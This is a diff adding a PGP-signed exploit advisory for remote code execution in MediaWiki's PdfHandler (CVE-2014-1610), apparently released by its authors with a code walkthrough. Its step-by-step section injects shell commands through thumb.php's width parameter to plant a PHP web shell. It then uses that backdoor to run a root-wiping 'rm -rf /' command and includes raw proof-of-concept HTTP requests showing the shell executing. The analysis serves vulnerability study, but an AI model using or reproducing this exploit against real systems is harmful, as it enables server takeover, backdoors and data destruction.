@@ -1,0 +1,183 @@
+-----BEGIN PGP SIGNED MESSAGE-----
+Hash: SHA1
+
+####################################################################
+#
+# MediaWiki <= 1.22.1 PdfHandler Remote Code Execution Exploit (CVE-2014-1610)
+# Reported by Netanel Rubin - Check Point’s Vulnerability Research Group (Jan 19, 2014)
+# Fixed in 1.22.2, 1.21.5 and 1.19.11 (Jan 30, 2014)
+# Affected website : Wikipedia.org and more !
+#
+# Exploit author : Xelenonz & @u0x (Pichaya Morimoto)
+# Release dates : Feb 1, 2014
+# Special Thanks to 2600 Thailand !
+#
+####################################################################
+
+# Exploit:
+####################################################################
+1. upload Longcat.pdf to wikimedia cms site (with PDF Handler enabled)
+http://vulnerable-site/index.php/Special:Upload
+2. inject os cmd to upload a php-backdoor
+http://vulnerable-site/thumb.php?f=Longcat.pdf&w=10|`echo%20
+"<?php%20system(\\$_GET[1]);">images/xnz.php`
+3. access to php-backdoor!
+http://vulnerable-site/images/xnz.php?1=rm%20-rf%20%2f%20--no-preserve-root
+4. happy pwning!!
+
+
+# Related files:
+####################################################################
+thumb.php <-- extract all _GET array to params
+/extensions/PdfHandler/PdfHandler_body.php <-- failed to escape w/width
+options
+/includes/media/ImageHandler.php
+/includes/GlobalFunctions.php
+/includes/filerepo/file/File.php
+
+# Vulnerability Analysis:
+####################################################################
+1. thumb.php
+This script used to resize images if it is configured to be done
+when the web browser requests the image
+<? ...
+1.1 Called directly, use $_GET params
+wfThumbHandleRequest();
+1.2 Handle a thumbnail request via query parameters
+function wfThumbHandleRequest() {
+$params = get_magic_quotes_gpc()
+? array_map( 'stripslashes', $_GET )
+: $_GET; << WTF
+
+wfStreamThumb( $params ); // stream the thumbnail
+}
+1.3 Stream a thumbnail specified by parameters
+function wfStreamThumb( array $params ) {
+...
+$fileName = isset( $params['f'] ) ? $params['f'] : ''; // << puts
+uploaded.pdf file here
+...
+// Backwards compatibility parameters
+if ( isset( $params['w'] ) ) {
+$params['width'] = $params['w']; // << Inject os cmd here!
+unset( $params['w'] );
+}
+...
+$img = wfLocalFile( $fileName );
+...
+// Thumbnail isn't already there, so create the new thumbnail...
+$thumb = $img->transform( $params, File::RENDER_NOW ); // << resize image
+by width/height
+...
+// Stream the file if there were no errors
+$thumb->streamFile( $headers );
+...
+?>
+2. /includes/filerepo/file/File.php
+<? ...
+function transform( $params, $flags = 0 ) { ...
+$handler = $this->getHandler(); // << PDF Handler
+...
+$normalisedParams = $params;
+$handler->normaliseParams( $this, $normalisedParams );
+...
+$thumb = $handler->doTransform( $this, $tmpThumbPath, $thumbUrl, $params );
+..
+?>
+3. /extensions/PdfHandler/PdfHandler_body.php
+<? ...
+function doTransform( $image, $dstPath, $dstUrl, $params, $flags = 0 ) {
+...
+$width = $params['width'];
+...
+$cmd = '(' . wfEscapeShellArg( $wgPdfProcessor ); // << craft shell cmd &
+parameters
+$cmd .= " -sDEVICE=jpeg -sOutputFile=- -dFirstPage={$page}
+-dLastPage={$page}";
+$cmd .= " -r{$wgPdfHandlerDpi} -dBATCH -dNOPAUSE -q ". wfEscapeShellArg(
+$srcPath );
+$cmd .= " | " . wfEscapeShellArg( $wgPdfPostProcessor );
+$cmd .= " -depth 8 -resize {$width} - "; // << FAILED to escape shell
+argument
+$cmd .= wfEscapeShellArg( $dstPath ) . ")";
+$cmd .= " 2>&1";
+...
+$err = wfShellExec( $cmd, $retval );
+...
+?>
+4. /includes/GlobalFunctions.php
+Execute a shell command, with time and memory limits
+<? ...
+function wfShellExec( $cmd, &$retval = null, $environ = array(), $limits =
+array() ) {
+...
+passthru( $cmd, $retval ); // << Execute here!!
+
+# Proof-Of-Concept
+####################################################################
+GET /mediawiki1221/thumb.php?f=longcat.pdf&w=10|`echo%20%22%3C
+php%20system(\\$_GET[1]);%22%3Eimages/longcat.php`
+HTTP/1.1
+Host: 127.0.0.1
+Connection: keep-alive
+Accept:
+text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Encoding: gzip,deflate,sdch
+Accept-Language: en-US,en;q=0.8
+Cookie: my_wikiUserID=2; my_wikiUserName=Longcat;
+my_wiki_session=op3h2huvddnmg7gji0pscfsg02
+
+<html><head><title>Error generating thumbnail</title></head>
+<body>
+<h1>Error generating thumbnail</h1>
+<p>
+เกิดปัญหาไม่สามารถทำรูปย่อได้: /bin/bash: -: command not found<br />
+convert: option requires an argument `-resize' @
+error/convert.c/ConvertImageCommand/2380.<br />
+GPL Ghostscript 9.10: Unrecoverable error, exit code 1<br />
+
+</p>
+
+</body>
+</html>
+
+
+GET /mediawiki1221/images/longcat.php?1=id HTTP/1.1
+Host: 127.0.0.1
+Connection: keep-alive
+Accept:
+text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Encoding: gzip,deflate,sdch
+Accept-Language: en-US,en;q=0.8
+Cookie: my_wikiLoggedOut=1391266363; my_wikiUserID=2;
+my_wikiUserName=Longcat; my_wiki_session=bvg0n4o0sn6ug04lg26luqfcg1
+
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+
+# Back-end $cmd
+####################################################################
+GlobalFunctions.php : wfShellExec()
+cmd = ('gs' -sDEVICE=jpeg -sOutputFile=- -dFirstPage=1 -dLastPage=1 -r150
+-dBATCH -dNOPAUSE -q '/var/www/mediawiki1221/images/2/27/Longcat.pdf' |
+'/usr/bin/convert' -depth 8 -resize 10|`echo "<?php
+system(\\$_GET[1]);">images/longcat.php` -
+'/tmp/transform_0e377aad0e27-1.jpg') 2>&1
+
+-----BEGIN PGP SIGNATURE-----
+Version: GnuPG v1.4.14 (GNU/Linux)
+
+iQIcBAEBAgAGBQJS7SLLAAoJEB2kHapd1XMU8BcP/A+hMUw/EDwChN+2XjtExVGU
+BzPrpXXBbp6WGWkeztmrT78Y1b1lXX/cQA4V9IGrdHUEdgG0p3y476d7eZ5sPxVf
+ny9Xg7o4WtMgmSvSOOc+lCsy9aAKab801cs1HLbwZokwK8ItwQQoGfik0BgNQ4l1
+mijELis1z1f3k6yJ9/OJicnIJDmHIzPL9wQyr2A5c+jjz74SR//SlQPrqDbvEpj2
+uCCpTpjf6LGYCzyGmqROlf+OxFTeXdB9oghButrEtQ9w6qGQg1/UZjmbx/xLkCqb
+GO1R4qs0PuV4uepwcbLzDDWW5kPejPjcwpuyjrpQO45OcIUtkvzR4iypCxxkvktv
+n2l09Dtn9HqbK3QXhTb2u3uhM9RyJd7kFKhfmZ85OnvMmYvaXSeDWs7Wd9GEO5wh
+FXbhL9O2u/bqiabQKnsJ6bx8hcm2a9mO+/yJZUyBXybHrjseRD4LQFWUYR/WPAQt
+vuICIQyO5pcjkIib+0DN4e7xcFMYuo3o6WkSZuZT+l0LwYDVmhUbaGAEP13+dWZZ
+M0HGoI7AITsqukYFH1n7NYjJazF3Bckc0iJbCrI39TYkvr3V9bRWSEfVBM6FcBan
+kumwDlzYP/301fsKGLtfsnUmK2qkj1EF3DVoJbZ5VFdgiUSlCMsbp9qdGfUPbelR
+2LmeyQR2rzjBB7Sovvcn
+=ooEs
+-----END PGP SIGNATURE-----
